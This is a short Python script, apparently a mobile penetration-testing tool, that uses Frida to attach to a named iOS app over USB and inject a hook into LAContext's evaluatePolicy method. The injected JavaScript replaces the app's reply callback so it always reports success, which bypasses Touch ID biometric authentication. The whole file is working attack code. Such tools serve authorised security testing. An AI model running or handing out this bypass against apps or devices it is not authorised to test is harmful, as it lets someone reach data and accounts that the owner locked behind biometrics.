import frida
import sys


def on_message(message, data):
    try:
        if message:
            print("[*] {0}".format(message["payload"]))
    except Exception as e:
        print(message)
        print(e)


def do_hook():

    # $methods: array containing native method names exposed by this object
    #
    # Usage: python touchid.py <your_app_name>
    # <your_app_name>: frida-ps -U
    
    
    hook = """
	if(ObjC.available) {
	    var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
	    Interceptor.attach(hook.implementation, {
	        onEnter: function(args) {
	            send("Hooking Touch Id..")
	            var block = new ObjC.Block(args[4]);
	            const appCallback = block.implementation;
	            block.implementation = function (error, value)  {
	                const result = appCallback(1, null);
	                return result;
	            };
	        },
	    });
	} else {
	    console.log("Objective-C Runtime is not available!");
	}
	"""
    return hook

if __name__ == '__main__':
    try:
        session = frida.get_usb_device(1).attach(str(sys.argv[1]))
        script = session.create_script(do_hook())
        script.on('message', on_message)
        script.load()
        sys.stdin.read()
    except KeyboardInterrupt:
        sys.exit(0)
